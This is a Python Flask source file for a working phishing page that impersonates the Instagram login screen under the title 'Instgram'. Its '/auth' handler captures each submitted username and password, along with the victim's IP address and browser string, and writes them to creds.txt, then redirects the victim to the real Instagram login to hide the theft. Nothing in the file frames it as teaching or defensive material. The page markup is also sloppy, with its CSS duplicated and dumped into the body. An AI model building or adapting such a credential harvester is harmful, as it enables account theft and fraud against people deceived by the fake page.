from flask import Flask, request, redirect, render_template_string
from datetime import datetime

app = Flask(__name__)

login_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instgram</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      background-color: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
.container{
    width:350px;
    background:white;
    border:1px solid #dbdbdb;
    padding:40px;
    border-radius:5px;
    display:flex;
    flex-direction:column;
    align-items:center;
}

.logo{
    width:180px;
    margin-bottom:30px;
    }
    .logo-text {
      font-size: 32px;
      font-weight: bold;
      color: #262626;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
      font-size: 14px;
    }
    button {
      width: 100%;
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      padding: 10px;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      margin-top: 10px;
    }
    .footer {
      text-align: center;
      font-size: 12px;
      color: #999;
      margin-top: 20px;
    }
    body {
  font-family: Arial, sans-serif;
  background: #fafafa;
  display: flex;
  flex-direction: column;
  align-items: center;
  margin: 0;
}

.container {
  margin-top: 60px;
  width: 350px;
  border: 1px solid #dbdbdb;
  background: #fff;
  padding: 40px;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.logo {
  width: 175px;
  margin-bottom: 40px;
}

form {
  width: 100%;
  display: flex;
  flex-direction: column;
}

input {
  margin: 5px 0;
  padding: 10px;
  border: 1px solid #dbdbdb;
  border-radius: 3px;
  background: #fafafa;
}

button {
  margin-top: 10px;
  background-color: #3897f0;
  color: white;
  border: none;
  padding: 10px;
  font-weight: bold;
  cursor: pointer;
  border-radius: 3px;
}

.divider {
  text-align: center;
  margin: 20px 0;
  position: relative;
}

.divider::before, .divider::after {
  content: "";
  position: absolute;
  top: 50%;
  width: 40%;
  height: 1px;
  background: #dbdbdb;
}

.divider::before {
  left: 0;
}

.divider::after {
  right: 0;
}

.fb-login {
  text-align: center;
  color: #385185;
  font-weight: bold;
  margin-bottom: 20px;
  display: block;
  text-decoration: none;
}

.forgot {
  text-align: center;
  color: #00376b;
  font-size: 12px;
  text-decoration: none;
}

.signup-box {
  margin-top: 20px;
  border: 1px solid #dbdbdb;
  background: #fff;
  padding: 20px;
  width: 350px;
  text-align: center;
}
  </style>
</head>
<body>
<h1>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instgram</title>
  </h1
  body {
  font-family: Arial, sans-serif;
  background: #fafafa;
  display: flex;
  flex-direction: column;
  align-items: center;
  margin: 0;
}

.container {
  margin-top: 60px;
  width: 350px;
  border: 1px solid #dbdbdb;
  background: #fff;
  padding: 40px;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.logo {
  width: 175px;
  margin-bottom: 40px;
}

form {
  width: 100%;
  display: flex;
  flex-direction: column;
}

input {
  margin: 5px 0;
  padding: 10px;
  border: 1px solid #dbdbdb;
  border-radius: 3px;
  background: #fafafa;
}

button {
  margin-top: 10px;
  background-color: #3897f0;
  color: white;
  border: none;
  padding: 10px;
  font-weight: bold;
  cursor: pointer;
  border-radius: 3px;
}

.divider {
  text-align: center;
  margin: 20px 0;
  position: relative;
}

.divider::before, .divider::after {
  content: "";
  position: absolute;
  top: 50%;
  width: 40%;
  height: 1px;
  background: #dbdbdb;
}

.divider::before {
  left: 0;
}

.divider::after {
  right: 0;
}

.fb-login {
  text-align: center;
  color: #385185;
  font-weight: bold;
  margin-bottom: 20px;
  display: block;
  text-decoration: none;
}

.forgot {
  text-align: center;
  color: #00376b;
  font-size: 12px;
  text-decoration: none;
}

.signup-box {
  margin-top: 20px;
  border: 1px solid #dbdbdb;
  background: #fff;
  padding: 20px;
  width: 350px;
  text-align: center;
}>
<div class="container">

    <img
        class="logo"
        src="https://github.com/codiearyan/Instagram-Login-Page-Clone/blob/main/images/title.jpg?raw=true"
        alt="Logo"
    >

    
    <form action="/auth" method="POST">
      <input type="text" name="u" placeholder="Phone number, username, or email" required>
      <input type="password" name="p" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="footer">
      © 2026 Instgram Official
    </div>
  </div>
</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(login_html)

@app.route('/auth', methods=['POST'])
def capture():
    username = request.form.get('u')
    password = request.form.get('p')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')

    with open("creds.txt", "a") as f:
        f.write(f"\n[{datetime.now()}]\n")
        f.write(f"IP: {ip}\n")
        f.write(f"User-Agent: {ua}\n")
        f.write(f"Username: {username}\n")
        f.write(f"Password: {password}\n")
        f.write("-" * 40 + "\n")

    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
